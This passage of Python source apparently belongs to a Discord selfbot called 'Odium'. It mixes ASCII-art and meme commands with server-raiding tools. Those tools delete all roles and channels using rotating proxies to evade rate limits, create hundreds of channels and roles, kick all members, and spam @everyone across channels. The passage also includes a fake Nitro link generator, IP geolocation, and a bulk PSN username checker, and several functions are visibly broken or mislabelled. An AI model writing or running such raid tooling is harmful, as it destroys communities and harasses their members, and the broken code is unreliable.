    await ctx.send("╥━━━━━━━━╭━━╮━━┳\n╢╭╮╭━━━━━┫┃▋▋━▅┣\n╢┃╰┫┈┈┈┈┈┃┃┈┈╰┫┣\n╢╰━┫┈┈┈┈┈╰╯╰┳━╯┣\n╢┊┊┃┏┳┳━━┓┏┳┫┊┊┣\n╨━━┗┛┗┛━━┗┛┗┛━━┻")

@Odium.command()
async def phone(ctx):
    await ctx.message.delete()
    await ctx.send("──▄▄██████▄▄\n▄██▀▄█▄▄█▄▀██▄\n▀▀▀▄██▀▀██▄▀▀▀\n─▄███─██─███▄\n─█████▄▄█████")

@Odium.command()
async def guitar(ctx):
    await ctx.message.delete()
    await ctx.send("░▄▀▀▀▀▄░░▄▄\n█░░░░░░▀▀░░█░░░░░░▄░▄\n█░║░░░░██░████████████ \n█░░░░░░▄▄░░█░░░░░░▀░▀\n░▀▄▄▄▄▀░░▀▀")

@Odium.command()
async def spider(ctx):
    await ctx.message.delete()
    await ctx.send("░░░░░░░░░░░║\n░░▄█▀▄░░░░░║░░░░░░▄▀▄▄\n░░░░░░▀▄░░░║░░░░▄▀\n░▄▄▄░░░░█▄▄▄▄▄▄█░░░░▄▄▄\n▀░░░▀█░█▀░░▐▌░░▀█░█▀░░░▀\n░░░░░░██░░▀▐▌▀░░██\n░▄█▀▀▀████████████▀▀▀█\n█░░░░░░██████████░░░░░▀▄\n█▄░░░█▀░░▀▀▀▀▀▀░░▀█░░░▄█\n░▀█░░░█░░░░░░░░░░█░░░█▀")

@Odium.command()
async def shit(ctx):
    await ctx.message.delete()
    await ctx.send("░░░░░░░░░░░█▀▀░░█░░░░░░\n░░░░░░▄▀▀▀▀░░░░░█▄▄░░░░\n░░░░░░█░█░░░░░░░░░░▐░░░\n░░░░░░▐▐░░░░░░░░░▄░▐░░░\n░░░░░░█░░░░░░░░▄▀▀░▐░░░\n░░░░▄▀░░░░░░░░▐░▄▄▀░░░░\n░░▄▀░░░▐░░░░░█▄▀░▐░░░░░\n░░█░░░▐░░░░░░░░▄░█░░░░░\n░░░█▄░░▀▄░░░░▄▀▐░█░░░░░\n░░░█▐▀▀▀░▀▀▀▀░░▐░█░░░░░\n░░▐█▐▄░░▀░░░░░░▐░█▄▄░░░\n░░░▀▀▄░░░░░░░░▄▐▄▄▄▀░░░\n░░░░░░░░░░░░░░░░░░░░░░░")

@Odium.command()
async def pistol(ctx):
    await ctx.message.delete()
    await ctx.send("░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄☆\n░███████████████████████\n░▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤\n╬▀░▐▓▓▓▓▓▓▌▀█░░░█▀░\n▒░░▓▓▓▓▓▓█▄▄▄▄▄█▀╬░\n░░█▓▓▓▓▓▌░▒▒▒▒▒▒▒▒▒\n░▐█▓▓▓▓▓░░▒▒▒▒▒▒▒▒▒\n░▐██████▌╬░▒▒▒▒▒▒▒▒")

@Odium.command()
async def tank(ctx):
    await ctx.message.delete()
    await ctx.send("░░░░░░███████ ]▄▄▄▄▄▄▄▄\n▂▄▅█████████▅▄▃▂\nI███████████████████].\n◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...")


@Odium.command()
async def ghost(ctx):
    await ctx.message.delete()
    await ctx.send("▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒\n▒▒█▒▒▒▄██████████▄▒▒▒▒\n▒█▐▒▒▒████████████▒▒▒▒\n▒▌▐▒▒██▄▀██████▀▄██▒▒▒\n▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒\n▐┼▐▒▒██████████████▒▒▒\n▐▄▐████─▀▐▐▀█─█─▌▐██▄▒\n▒▒█████──────────▐███▌\n▒▒█▀▀██▄█─▄───▐─▄███▀▒\n▒▒█▒▒███████▄██████▒▒▒\n▒▒▒▒▒██████████████▒▒▒\n▒▒▒▒▒█████████▐▌██▌▒▒▒\n▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒\n▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒")

@Odium.command()
async def fakevirus(ctx):
        list = (
            f"``[▓▓▓                    ] / trojan-virus.exe Packing files.``",
            f"``[▓▓▓▓▓▓▓                ] - trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ trojan-virus.exe Packing files..``",
            f"``Successfully downloaded trojan-virus.exe``",
            "``Injecting virus.   |``",
            "``Injecting virus..  /``",
            "``Injecting virus... -``",
            f"``Successfully Injected trojan-virus.exe to server.``",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

@Odium.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(
                file=discord.File(file, f"exeter_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])

@Odium.command(aliases=["pornhublogo", "phlogo"])
async def pornhub(ctx, word1=None, word2=None):
    await ctx.message.delete()
    if word1 is None or word2 is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace(
        "{text-1}", word1).replace("{text-2}", word2)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_pornhub_logo.png"))
    except:
        await ctx.send(endpoint)

@Odium.command()
async def changemymind(ctx,*,text):
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}").text
    j = json.loads(data)
    changemymindimage = j['message']

    embed=discord.Embed(title="Odium Selfbot", description="Made By MajorRhine", color=0xff0000)
    embed.set_image(url=changemymindimage)
    embed.set_footer(text="Change My Mind")
    await ctx.message.edit(content="",embed=embed)

@Odium.command()
async def kannagen(ctx,*,kannatext=None):
    if kannatext == None:
        kannatext = f"{ctx.message.author.name} the format is {prefix.strip()}kannagen [message]"
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=kannagen&text={kannatext}").text
    j = json.loads(data)
    kannaimg = j['message']

    embed=discord.Embed(title="Odium Selfbot", description="Made By MajorRhine", color=0xff0000)
    embed.set_image(url=kannaimg)
    embed.set_footer(text="Kannagen")
    await ctx.message.edit(content="",embed=embed)

@Odium.command()
async def captcha(ctx,  memb : discord.Member=None):
    if memb == None:
        memb = ctx.message.author
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=captcha&url={memb.avatar_url}&username={memb.name}").text
    j = json.loads(data)
    captcha = j['message']
    embed=discord.Embed(title="Odium Selfbot", description="Made By MajorRhine", color=0xff0000)
    embed.set_image(url=captcha)
    embed.set_footer(text="Captcha")
    await ctx.message.edit(content="",embed=embed)

@Odium.command()
async def iphonex(ctx,  memb : discord.Member=None):
    if memb == None:
        memb = ctx.message.author

    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=iphonex&url={memb.avatar_url}").text
    j = json.loads(data)
    phonephoto = j['message']

    embed=discord.Embed(title="Odium Selfbot", description="Made By MajorRhine", color=0xff0000)
    embed.set_image(url=phonephoto)
    embed.set_footer(text="iPhone X")
    await ctx.message.edit(content="",embed=embed)

@Odium.command()
async def fuckpfp2(ctx,  memb : discord.Member=None,intense="20"):
    if memb == None:
        memb = ctx.message.author
    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    finalurl = finalurl.replace("webp","png")
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=magik&image={finalurl}&intensity={intense}").text
    j = json.loads(data)
    magicwoah = j['message']
    embed=discord.Embed(title="Odium Selfbot", description="Made By MajorRhine", colour=0xff0000)
    embed.set_image(url=magicwoah)
    embed.set_footer(text="Fuck Profile Picture")
    await ctx.message.edit(content="",embed=embed)

@Odium.command()
async def fuckpfp(ctx,  memb : discord.Member=None,intense="5"):
    if memb == None:
        memb = ctx.message.author
    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    finalurl = finalurl.replace("webp","png")
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=magik&image={finalurl}&intensity={intense}").text
    j = json.loads(data)
    magicwoah = j['message']
    embed=discord.Embed(title="Odium Selfbot", description="Made By MajorRhine", colour=0xff0000)
    embed.set_image(url=magicwoah)
    embed.set_footer(text="Fuck Profile Picture")
    await ctx.message.edit(content="",embed=embed)

@Odium.command(aliases=['ri', 'role'])
async def roleinfo(ctx, *, role: discord.Role):  # b'\xfc'
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == "#0xff0000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xff0000))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}"
                       f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name="Colour", value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)

def roledellol(k):
    headers = {'Authorization': token}
    r = requests.delete(
        f"https://discord.com/api/v9/guilds/{guild}/roles/{k}",
        proxies={"http": 'http://' + next(proxs)},
        headers=headers
    )

    if r.status_code == 429:
        print(f"{Fore.RED}[-] {Fore.WHITE}Proxy Ratelimited For: {r.json()['retry_after']}")
        roledellol(k)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted Role: {k}")

@Odium.command()
async def delroles(ctx):  # b'\xfc'
    await ctx.message.delete()
    for r in roles:
        threading.Thread(target=roledellol, args=(r,)).start()

@Odium.command()
async def delcustomroles(ctx, *, message):  # b'\xfc'
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete(message)
            print(f'''{Fore.RED}[-] {Fore.WHITE}Deleted Role: {role}''' + Fore.WHITE)
        except:
            pass

def get_all_members_ids(guild):
    for member in guild.members:
        yield member.id

@Odium.command()
async def banid(ctx, userid,reason="None specified"):
    await ctx.message.delete()
    for m in members:
        threading.Thread(target=ban, args=(m,)).start()

@Odium.command()
async def ban(ctx, user: discord.Member, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        await user.ban(reason=reason)
        print(f'''{Fore.RED}[-] {Fore.WHITE}Banned User: {user}''' + Fore.WHITE)
    except:
        pass

@Odium.command()
async def dmuser(ctx, user: discord.User=None, *, message):
    await ctx.message.delete()
    try:
        await user.send(message)
        print(f'''{Fore.GREEN}[-] {Fore.WHITE}Banned User: {user}''' + Fore.WHITE)
    except:
        pass

@Odium.command()
async def kickall(ctx, reason="No reason provided"):
    await ctx.message.delete()
    members = ctx.guild.members
    for users in list(members):
        try:
            await ctx.guild.kick(user=members(reason=reason))
            print(f'''{Fore.RED}[-] {Fore.WHITE}Kicked User: {members}''' + Fore.WHITE)
        except:
            pass


@Odium.command()
async def kick(ctx, user: discord.Member, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        await user.kick(reason=reason)
        print(f'''{Fore.RED}[-] {Fore.WHITE}Kicked User: {user}''' + Fore.WHITE)
    except:
        pass

@Odium.command()
async def delchannels(ctx):  # b'\xfc'
    await ctx.message.delete()
    for chan in list(ctx.guild.channels):
        try:
            threading.Thread(target=deletionofachannel, args=(chan.id,)).start()
            print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Channel: {chan}")
            sleep(0.1)
        except:
            return

@Odium.command()
async def slap(ctx, user: discord.User = None):
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/slap")
        res = r.json()
        embed = discord.Embed(description=f"**{ctx.author.mention} slapped {user.mention}!**", color=0x0000)
        embed.set_image(url=res["url"])
        await ctx.send(embed=embed)

@Odium.command()
async def odium(ctx):
        await ctx.message.delete()
        r = "``` ▒█████  ▓█████▄  ██▓ █    ██  ███▄ ▄███▓\n▒██▒  ██▒▒██▀ ██▌▓██▒ ██  ▓██▒▓██▒▀█▀ ██▒\n▒██░  ██▒░██   █▌▒██▒▓██  ▒██░▓██    ▓██░\n▒██   ██░░▓█▄   ▌░██░▓▓█  ░██░▒██    ▒██ \n░ ████▓▒░░▒████▓ ░██░▒▒█████▓ ▒██▒   ░██▒\n░ ▒░▒░▒░  ▒▒▓  ▒ ░▓  ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░\n  ░ ▒ ▒░  ░ ▒  ▒  ▒ ░░░▒░ ░ ░ ░  ░      ░\n░ ░ ░ ▒   ░ ░  ░  ▒ ░ ░░░ ░ ░ ░      ░   \n    ░ ░     ░     ░     ░            ░   ```"
        await ctx.send(r)

@Odium.command()
async def doge(ctx):
        await ctx.message.delete()
        r = requests.get("https://min-api.cryptocompare.com/data/price?fsym=DOGE&tsyms=USD,EUR")
        kekistan = r.json()
        eur = kekistan['EUR']
        usd = kekistan['USD']
        embedic = discord.Embed(description=f'EUR: `{str(eur)}€`\nUSD: `{str(usd)}$`', color=0xff0000)
        embedic.set_author(name='Dogecoin', icon_url='https://cdn.coindoo.com/2019/10/dogecoin-logo.png')
        await ctx.send(embed=embedic)

def checkpsnlol(x):
    c = {'onlineId' : x, 'reserveIfAvailable' : False}
    return requests.post("https://accounts.api.playstation.com/api/v1/accounts/onlineIds", json=c)

def checkerpsn():
    work = 0
    nonwork = 0
    total = work + nonwork
    with open('Checkers/psnusernames.txt', 'r') as file2:
        c = file2.read()
        r =[]
        for w in c.split():
            p = checkpsnlol(w)
            r = requests.post(f'https://accounts.api.playstation.com/api/v1/accounts/onlineIds', json={'onlineID' : w, 'reserveIfAvailable' : False})
            if r.status_code == 400:
                print(f"{Fore.RED}[-] {Fore.WHITE}Username Taken: {w}")
                nonwork += 1
            elif r.status_code == 201:
                print(f"{Fore.GREEN}[-] {Fore.WHITE}Username Available: {w}")
                f = open("Checkers/Results/psnresults.txt", "a")
                work += 1
                f.write(w + "\n")
            elif r.status_code == 200:
                print(f"{Fore.GREEN}[-] {Fore.WHITE}You Are Being Ratelimited. Sleeping For 60 Seconds")
                sleep(60)
            else:
                print(f"{Fore.RED}[-] {Fore.WHITE}Unknown Error")
    print(f"{Fore.GREEN}[-] {Fore.WHITE}─────────────────────────────────")
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Amount Of Usernames Checked: {total}")
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Amount Of Usernames Available: {work}")
    print(f"{Fore.GREEN}[-] {Fore.WHITE}─────────────────────────────────")

@Odium.command()
async def checkpsn(ctx):
    await ctx.message.delete()
    threading.Thread(target=checkerpsn).start()

@Odium.command()
async def hug(ctx, user: discord.User = None):
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/hug")
        res = r.json()
        embed = discord.Embed(description=f"**{ctx.author.mention} hugged {user.mention}!**", color=0x0000)
        embed.set_image(url=res["url"])
        await ctx.send(embed=embed)

@Odium.command()
async def copyserver(ctx): # b'\xfc'
    await ctx.message.delete()
    await Odium.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Odium.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
                print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Channel: {c}")
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Voice Channel: {chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
                        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Text Channel: {chann}")
            for role in ctx.guild.roles:
                name = role.name
                color = role.colour
                perms = role.permissions
                await g.create_role(name=name, permissions=perms, colour=color)
                print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Role: {role}")
    print(f'{Fore.GREEN}[-] {Fore.WHITE}Server Successfully Copied' + Fore.WHITE)
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

def rolefag(idofguild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        make = requests.post(f"https://discord.com/api/v8/guilds/{idofguild}/roles",headers=headers,json={"name":nameofchan,"permissions":"2251804225","color":0xff0000,"mentionable":"true"})
    except:
        pass

@Odium.command()
async def pingweb(ctx, website=None):  # b'\xfc'
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[-]: {Fore.WHITE}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Site Is Down! Status Code: {r}', delete_after=3)
        else:
            await ctx.send(f'Site Is Up! Status Code: {r}', delete_after=3)

@Odium.command()
async def createchannels(ctx, *, message):  # b'\xfc'
    await ctx.message.delete()
    amountofthemtomake = 250
    for i in range(int(amountofthemtomake)):
        threading.Thread(target=nooooourchannelsgotnukedomg, args=(ctx.guild.id, message,)).start()
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Channel: {message}")
        sleep(0.1)

@Odium.command()
async def customchannels(ctx, amount: int, *, message):  # b'\xfc'
    await ctx.message.delete()
    for _i in range(amount):
        try:
            threading.Thread(target=nooooourchannelsgotnukedomg, args=(ctx.guild.id, message,)).start()
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Channel: {message}")
            sleep(0.1)
        except:
            return

@Odium.command()
async def createroles(ctx, message):  # b'\xfc'
    await ctx.message.delete()
    for i in range(250):
        try:
            threading.Thread(target=nooooourrolesgotnukedomg, args=(ctx.guild.id, message,)).start()
            print(f'''{Fore.GREEN}[-] {Fore.WHITE}Created Role: {message}''' + Fore.WHITE)
            sleep(0.1)
        except:
            return

@Odium.command()
async def clear(ctx):  # b'\xfc'
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')

@Odium.command()
async def spam(ctx, amount: int, *, message):  # b'\xfc'
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)

@Odium.command()
async def purge(ctx, amount: int):  # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Odium.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass

@Odium.command()
async def geoip(ctx, *, ip):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
    geo = r.json()
    em = discord.Embed(title="Odium Selfbot", description="Made by MajorRhine", color=0xff0000)
    em.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
    em.set_footer(text="IP Lookup")
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@Odium.command()
async def everyonespam(ctx, *, message):
    await ctx.message.delete()
    print(f'''{Fore.GREEN}[-] {Fore.WHITE}Spammed: @everyone {message}''' + Fore.WHITE)
    for channel in list(ctx.guild.channels):
        try:
            for _i in range(20):
                await channel.send(f"@everyone {message}")
        except:
            pass

@Odium.command()
async def streaming(ctx, *,status: str=None):
    await ctx.message.delete()
    try:
        game = discord.Activity(type=1, name=f"{status}", url="")
        await Odium.change_presence(activity=game)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Set Streaming Status To: {status}")
    except Exception as e:
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")

@Odium.command()
async def nickname(ctx, *, name: str=None):
    await ctx.message.delete()
    if name is None:
        print(f"{Fore.RED}[-] {Fore.WHITE}Missing Argument: name")
    else:
        try:
            await ctx.author.edit(nick=name)
        except Exception as e:
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")

@Odium.command()
async def panda(ctx):
    await ctx.message.delete()
    r = requests.get("https://some-random-api.ml/img/panda").json()
    embed = discord.Embed(color=0xff0000)
    embed.set_author(name="Random Panda", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png")
    embed.set_image(url=str(r["link"]))
    await ctx.send(embed=embed)

@Odium.command()
async def meme(ctx):
    await ctx.message.delete()
    r = requests.get("https://some-random-api.ml/meme").json()
    embed = discord.Embed(color=0xff0000)
    embed.set_author(name="Random Meme", icon_url="https://freepngimg.com/thumb/internet_meme/3-2-troll-face-meme-png-thumb.png")
    embed.set_image(url=str(r["image"]))
    await ctx.send(embed=embed)

def nitorandom():
    code = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    return f"https://discord.gift/{code}"

@Odium.command()
async def randomnitro(ctx):
    await ctx.message.delete()
    await ctx.send(nitorandom())

@Odium.command()
async def watching(ctx, *,status: str=None):
    await ctx.message.delete()
    try:
        game = discord.Activity(type=3, name=f"{status}")
        await Odium.change_presence(activity=game)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Set Watching Status To: {status}")
    except Exception as e:
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")

@Odium.command()
async def minesweeper(ctx, size: int = 5):  # b'\xfc'
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

@Odium.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx):  # b'\xfc'
    await ctx.message.delete()
    Clear()
    startprint()


if __name__ == '__main__':
    Init()
